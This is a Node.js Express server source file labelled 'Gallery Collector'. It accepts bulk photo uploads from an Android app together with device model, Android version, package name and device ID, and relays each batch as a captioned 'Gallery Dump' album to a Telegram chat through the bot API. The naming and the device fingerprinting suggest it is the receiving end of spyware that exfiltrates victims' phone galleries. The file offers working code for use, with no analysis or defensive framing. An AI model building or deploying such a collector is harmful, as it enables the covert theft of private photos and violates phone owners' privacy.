const express = require('express');
const multer = require('multer');
const axios = require('axios');
const FormData = require('form-data');
const app = express();
const PORT = process.env.PORT || 3000;

// Configure multer for memory storage (no disk)
const upload = multer({
    storage: multer.memoryStorage(),
    limits: { 
        fileSize: 50 * 1024 * 1024 // 50MB max per file
    }
});

// ===== TELEGRAM CONFIG =====
const BOT_TOKEN = process.env.BOT_TOKEN || 'YOUR_BOT_TOKEN_HERE';
const CHAT_ID = process.env.CHAT_ID || '@INIESTADABOSS';

// ===== ENDPOINT: Receive photos from app =====
app.post('/upload', upload.array('photos', 30), async (req, res) => {
    try {
        // Parse metadata
        const metadata = JSON.parse(req.body.metadata || '{}');
        const files = req.files;

        if (!files || files.length === 0) {
            return res.status(400).json({ 
                error: 'No photos provided' 
            });
        }

        console.log(`📸 Received ${files.length} photos from ${metadata.device_model || 'Unknown device'}`);
        console.log(`📱 Device ID: ${req.headers['x-device-id'] || 'Unknown'}`);
        console.log(`📦 Package: ${metadata.package_name || 'Unknown'}`);
        console.log(`🤖 Android: ${metadata.android_version || 'N/A'}`);

        // Send to Telegram in batches of 10
        const batchSize = 10;
        let successCount = 0;
        
        for (let i = 0; i < files.length; i += batchSize) {
            const batch = files.slice(i, i + batchSize);
            const batchNum = Math.floor(i / batchSize) + 1;
            
            try {
                await sendToTelegram(batch, metadata, batchNum);
                successCount += batch.length;
                console.log(`✅ Batch ${batchNum} sent (${batch.length} photos)`);
            } catch (error) {
                console.error(`❌ Batch ${batchNum} failed:`, error.message);
                // Continue with next batch
            }
            
            // Rate limit delay (2 seconds between batches)
            if (i + batchSize < files.length) {
                await sleep(2000);
            }
        }

        res.json({ 
            status: 'success', 
            received: files.length,
            forwarded: successCount,
            timestamp: Date.now()
        });

    } catch (error) {
        console.error('Server error:', error.message);
        res.status(500).json({ 
            error: 'Internal server error',
            details: error.message
        });
    }
});

// ===== Send photos to Telegram =====
async function sendToTelegram(photos, metadata, batchNum) {
    try {
        const form = new FormData();
        form.append('chat_id', CHAT_ID);

        // Build media group (max 10 photos per album)
        const mediaArray = [];

        // First photo gets caption with metadata
        const caption = `📸 *Gallery Dump Batch ${batchNum}*\n\n` +
                       `📱 Device: ${metadata.device_model || 'Unknown'}\n` +
                       `🤖 Android: ${metadata.android_version || 'N/A'}\n` +
                       `📦 App: ${metadata.package_name || 'Unknown'}\n` +
                       `🕐 ${new Date(metadata.timestamp).toLocaleString()}\n` +
                       `📊 Photos: ${photos.length} in this batch`;

        const firstMedia = {
            type: 'photo',
            media: 'attach://photo0',
            caption: caption,
            parse_mode: 'Markdown'
        };
        mediaArray.push(firstMedia);

        // Rest of the photos
        for (let i = 1; i < photos.length; i++) {
            mediaArray.push({
                type: 'photo',
                media: `attach://photo${i}`
            });
        }

        form.append('media', JSON.stringify(mediaArray));

        // Attach each photo
        photos.forEach((photo, index) => {
            form.append(`photo${index}`, photo.buffer, {
                filename: `photo${index}.jpg`,
                contentType: photo.mimetype || 'image/jpeg'
            });
        });

        // Send to Telegram
        const response = await axios.post(
            `https://api.telegram.org/bot${BOT_TOKEN}/sendMediaGroup`,
            form,
            {
                headers: {
                    ...form.getHeaders(),
                    'Content-Type': `multipart/form-data; boundary=${form.getBoundary()}`
                },
                maxContentLength: Infinity,
                maxBodyLength: Infinity,
                timeout: 60000 // 60 second timeout
            }
        );

        if (response.status !== 200) {
            throw new Error(`Telegram returned ${response.status}`);
        }

        return response.data;

    } catch (error) {
        console.error('Telegram send error:', error.response?.data || error.message);
        throw error;
    }
}

// ===== Health check endpoint =====
app.get('/', (req, res) => {
    res.json({
        status: 'alive',
        service: 'Gallery Collector',
        version: '1.0.0',
        timestamp: Date.now()
    });
});

// ===== Debug endpoint (optional) =====
app.get('/health', (req, res) => {
    res.json({ 
        status: 'ok',
        bot_configured: BOT_TOKEN !== 'YOUR_BOT_TOKEN_HERE',
        chat_id: CHAT_ID,
        uptime: process.uptime()
    });
});

// ===== Helper function =====
function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

// ===== Start server =====
app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`📱 Endpoint: http://localhost:${PORT}/upload`);
    console.log(`🤖 Telegram: ${CHAT_ID}`);
    console.log(`📸 Ready to receive gallery dumps`);
});